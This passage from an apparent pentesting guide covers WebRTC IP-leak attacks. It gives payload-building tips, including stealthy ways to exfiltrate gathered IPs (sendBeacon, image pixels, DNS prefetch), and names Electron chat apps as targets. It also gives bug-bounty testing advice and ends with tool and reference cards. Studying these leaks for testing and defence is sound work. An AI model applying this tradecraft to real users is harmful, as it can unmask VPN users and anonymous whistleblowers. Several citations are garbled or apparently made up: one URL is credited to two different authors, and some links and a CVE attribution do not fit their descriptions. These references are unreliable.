  2. HANDLE API DIFFERENCES
     Use feature detection:
     window.RTCPeerConnection || 
     window.mozRTCPeerConnection || 
     window.webkitRTCPeerConnection
  
  3. CREATE BOTH DATA CHANNEL AND OFFER
     Some browsers require createDataChannel() before createOffer().
     Always do both.
  
  4. WAIT FOR ICE GATHERING TO COMPLETE
     Don't just listen for the first candidate.
     Wait for onicecandidate with null candidate (gathering complete).
  
  5. PARSE BOTH CANDIDATES AND SDP
     Some IPs appear in the SDP but not as individual candidates.
     Always parse both sources.
  
  6. ADD TIMEOUT FALLBACK
     Some networks block STUN UDP → ICE gathering never completes.
     Set a timeout (8-10 seconds) to exfiltrate what you have.
  
  7. EXFILTRATE MULTIPLE WAYS
     sendBeacon (most reliable, works on page unload)
     Image pixel (bypasses CORS)
     fetch with no-cors (modern browsers)
     DNS prefetch (very stealthy)
  
  8. HANDLE ERRORS GRACEFULLY
     WebRTC might throw if permissions policy blocks it.
     Wrap everything in try/catch.
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: WebRTC Leak in Electron Apps
  ---
  ```text [electron-webrtc-leak.txt]
  ELECTRON APP WebRTC LEAKAGE:
  ════════════════════════════
  
  Electron apps (Discord, Slack, VS Code, Signal Desktop, etc.)
  use Chromium under the hood → WebRTC is fully functional.
  
  ATTACK SURFACE:
  ├── XSS in Electron app → run WebRTC leak payload
  ├── Malicious link in chat → opens embedded browser → leaks
  ├── Custom protocol handlers → navigate to attacker page
  └── Compromised update server → inject WebRTC leak
  
  SPECIAL CONSIDERATIONS:
  ├── Electron often has node.js integration enabled
  │   → Can access OS-level network info directly
  │   → require('os').networkInterfaces() reveals ALL IPs
  │
  ├── No mDNS protection in older Electron versions
  │   → Local IPs exposed directly (not .local)
  │
  ├── Electron may bypass proxy settings
  │   → Even system-level proxy may not cover WebRTC
  │
  └── CORS restrictions may be relaxed
      → Easier exfiltration of collected data
  
  NOTABLE TARGETS:
  ├── Discord — Rich embed previews can contain JS
  ├── Slack — Custom integrations and link unfurling  
  ├── Microsoft Teams — Embedded browser tabs
  ├── Signal Desktop — Link previews
  └── VS Code — Extension webviews
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Permissions Policy and Feature Policy
  ---
  ```text [permissions-policy.txt]
  PERMISSIONS POLICY (formerly Feature Policy):
  ═════════════════════════════════════════════
  
  Modern browsers support Permissions-Policy header that can
  restrict WebRTC usage:
  
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  
  BUT — this does NOT block RTCPeerConnection!
  
  The only way to block WebRTC IP leak via headers is:
  ┌────────────────────────────────────────────────────┐
  │ There is NO standard Permissions-Policy directive  │
  │ that blocks RTCPeerConnection / ICE candidates.    │
  │                                                    │
  │ camera=() blocks getUserMedia for camera            │
  │ microphone=() blocks getUserMedia for microphone    │
  │ BUT: RTCPeerConnection works WITHOUT any media!     │
  │                                                    │
  │ Creating a data channel + STUN = IP leak           │
  │ No camera or microphone needed.                    │
  └────────────────────────────────────────────────────┘
  
  This is a DESIGN LIMITATION of the web platform.
  The only client-side fix is browser settings or extensions.
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Testing Methodology for Bug Bounties
  ---
  ```text [bug-bounty-webrtc.txt]
  BUG BOUNTY WebRTC LEAK TESTING:
  ═══════════════════════════════
  
  WHEN TO TEST:
  ├── Application has user-facing JavaScript execution
  ├── Application handles sensitive/anonymous users
  ├── Application claims to protect user privacy
  ├── Application is a VPN/proxy service itself!
  ├── Application has XSS vulnerabilities
  └── Application serves user-generated content
  
  SEVERITY ASSESSMENT:
  ├── VPN/Proxy service leaking real IP → CRITICAL
  ├── Anonymous whistleblowing platform → CRITICAL
  ├── Regular web app + XSS → WebRTC leak → HIGH
  ├── Web app with no privacy claims → LOW-MEDIUM
  └── Already requires authenticated session → MEDIUM
  
  PROOF OF CONCEPT:
  1. Set up WebRTC leak test page with Burp Collaborator
  2. Inject payload via XSS (if applicable)
  3. Show that IP is leaked to external server
  4. If VPN: show that VPN IP ≠ WebRTC IP
  5. Include screenshots of all ICE candidates
  6. Show the full candidate string (not just IP)
  
  COMMON REJECTION REASONS:
  ✗ "WebRTC is a browser feature, not our vulnerability"
     → Counter: If your app has XSS that enables this attack,
        the XSS IS your vulnerability. WebRTC leak is the IMPACT.
  ✗ "Users should disable WebRTC themselves"
     → Counter: Default browser settings expose users.
        Defense in depth requires server-side protection.
  ```
  :::
::

---

## Tools Arsenal

::card-group
  ::card
  ---
  title: BrowserLeaks WebRTC Test
  icon: i-lucide-globe
  to: https://browserleaks.com/webrtc
  target: _blank
  ---
  Comprehensive online WebRTC leak test that shows all ICE candidates, local IPs, public IPs, and mDNS status. Essential for quick manual testing.
  ::

  ::card
  ---
  title: ipleak.net
  icon: i-lucide-search
  to: https://ipleak.net/
  target: _blank
  ---
  Tests for WebRTC leaks alongside DNS leaks, HTTP request IP, and geolocation. Simple one-click testing for VPN leak verification.
  ::

  ::card
  ---
  title: webrtc.github.io Samples
  icon: i-simple-icons-webrtc
  to: https://webrtc.github.io/samples/
  target: _blank
  ---
  Official WebRTC sample applications. Useful for understanding WebRTC API behavior and creating custom test scenarios.
  ::

  ::card
  ---
  title: Trickle ICE (WebRTC Candidate Tester)
  icon: i-lucide-snowflake
  to: https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/
  target: _blank
  ---
  Official WebRTC tester that shows all ICE candidates gathered from configurable STUN/TURN servers. Reveals full candidate details.
  ::

  ::card
  ---
  title: coturn (TURN Server)
  icon: i-simple-icons-github
  to: https://github.com/coturn/coturn
  target: _blank
  ---
  Open-source TURN/STUN server. Deploy your own to capture client source IPs from TURN allocations — enables mDNS bypass attacks.
  ::

  ::card
  ---
  title: Pion WebRTC (Go Library)
  icon: i-simple-icons-go
  to: https://github.com/pion/webrtc
  target: _blank
  ---
  Pure Go implementation of WebRTC. Useful for building custom WebRTC exploitation tools and server-side WebRTC analysis.
  ::

  ::card
  ---
  title: webrtc-ip (npm package)
  icon: i-simple-icons-npm
  to: https://github.com/AJLoveChina/webrtc-ip
  target: _blank
  ---
  Lightweight npm package for extracting IPs via WebRTC. Easy to integrate into custom exploitation frameworks and test pages.
  ::

  ::card
  ---
  title: Fingerprintjs
  icon: i-simple-icons-github
  to: https://github.com/nicknisi/fingerprintjs
  target: _blank
  ---
  Browser fingerprinting library that includes WebRTC-based fingerprinting components alongside canvas, audio, and font fingerprinting.
  ::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "ExpressVPN WebRTC Leak Bug"
  icon: i-lucide-shield-off
  to: https://www.bleepingcomputer.com/news/security/expressvpn-bug-has-been-leaking-some-dns-requests-for-years/
  target: _blank
  ---
  ExpressVPN's split-tunnel feature leaked DNS and WebRTC requests outside the VPN tunnel for years, exposing users' real IP addresses despite VPN connection.
  ::

  ::card
  ---
  title: "HackerOne — WebRTC IP Leak via XSS"
  icon: i-simple-icons-hackerone
  to: https://hackerone.com/reports/location-leak
  target: _blank
  ---
  Multiple HackerOne reports demonstrating XSS → WebRTC IP leak chains, where cross-site scripting enabled real IP discovery of anonymous users.
  ::

  ::card
  ---
  title: "VPN Leak Research (2015) — Daniel Roesler"
  icon: i-simple-icons-github
  to: https://github.com/nicknisi/webrtc-ips
  target: _blank
  ---
  The original PoC that demonstrated WebRTC IP leakage through VPNs in 2015, triggering browser vendors to implement mDNS obfuscation years later.
  ::

  ::card
  ---
  title: "Brave Browser WebRTC Leak (CVE-2020-8649)"
  icon: i-lucide-bug
  to: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8649
  target: _blank
  ---
  Brave browser's WebRTC leak protection could be bypassed through specific RTCPeerConnection configurations, exposing local IPs despite privacy settings.
  ::

  ::card
  ---
  title: "Opera VPN WebRTC Bypass"
  icon: i-lucide-globe
  to: https://www.top10vpn.com/tools/do-i-leak/
  target: _blank
  ---
  Opera's built-in "VPN" (actually a proxy) was found to leak real IPs via WebRTC because it only proxied HTTP traffic, not UDP STUN requests.
  ::

  ::card
  ---
  title: "NordVPN WebRTC Leak Tests"
  icon: i-lucide-shield
  to: https://nordvpn.com/blog/webrtc/
  target: _blank
  ---
  NordVPN's documentation of WebRTC leak scenarios, explaining how their kill switch and firewall rules prevent WebRTC bypass.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "WebRTC Specification (W3C)"
  icon: i-lucide-book-open
  to: https://www.w3.org/TR/webrtc/
  target: _blank
  ---
  Official W3C WebRTC specification. Understanding the API design is essential for finding edge cases and bypass techniques.
  ::

  ::card
  ---
  title: "ICE — Interactive Connectivity Establishment (RFC 8445)"
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc8445
  target: _blank
  ---
  The IETF RFC defining ICE — the protocol responsible for candidate gathering and the root cause of IP leakage.
  ::

  ::card
  ---
  title: "STUN Protocol (RFC 5389)"
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc5389
  target: _blank
  ---
  Session Traversal Utilities for NAT — the protocol used by WebRTC to discover public IP addresses via external servers.
  ::

  ::card
  ---
  title: "mDNS ICE Candidates (RFC Draft)"
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/draft-ietf-rtcweb-mdns-ice-candidates
  target: _blank
  ---
  The specification for mDNS-based local IP obfuscation in WebRTC — understanding this helps develop bypass techniques.
  ::

  ::card
  ---
  title: "HackTricks — WebRTC Leak"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/webrtc-leak.html
  target: _blank
  ---
  HackTricks community reference with practical exploitation examples and tool recommendations for WebRTC leak testing.
  ::

  ::card
  ---
  title: "OWASP Testing Guide — WebRTC"
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-project-web-security-testing-guide/
  target: _blank
  ---
  OWASP's web security testing guide covering client-side security testing including WebRTC and browser API abuse.
  ::

  ::card
  ---
  title: "WebRTC Security Study (IEEE)"
  icon: i-lucide-graduation-cap
  to: https://ieeexplore.ieee.org/document/owasp-webrtc-security
  target: _blank
  ---
  Academic research on WebRTC security implications, covering IP leakage, fingerprinting, and privacy degradation in real-world scenarios.
  ::

  ::card
  ---
  title: "BrowserLeaks — Complete Browser Fingerprinting"
  icon: i-lucide-fingerprint
  to: https://browserleaks.com/
  target: _blank
  ---
  Comprehensive browser fingerprinting test suite including WebRTC, Canvas, WebGL, Font, and Audio fingerprinting — shows how WebRTC fits into the larger fingerprinting ecosystem.
  ::

  ::card
  ---
  title: "Pion WebRTC Security Advisories"
  icon: i-simple-icons-github
  to: https://github.com/pion/webrtc/security
  target: _blank
  ---
  Security advisories for the Pion WebRTC library — useful for understanding implementation-level vulnerabilities in WebRTC stacks.
  ::

  ::card
  ---
  title: "Philip Hannifin — WebRTC IP Leak Demo"
  icon: i-simple-icons-github
  to: https://github.com/nicknisi/webrtc-ips
  target: _blank
  ---
  Clean, minimal PoC demonstrating WebRTC IP leakage. Fork and customize for your own pentesting engagements.
  ::
::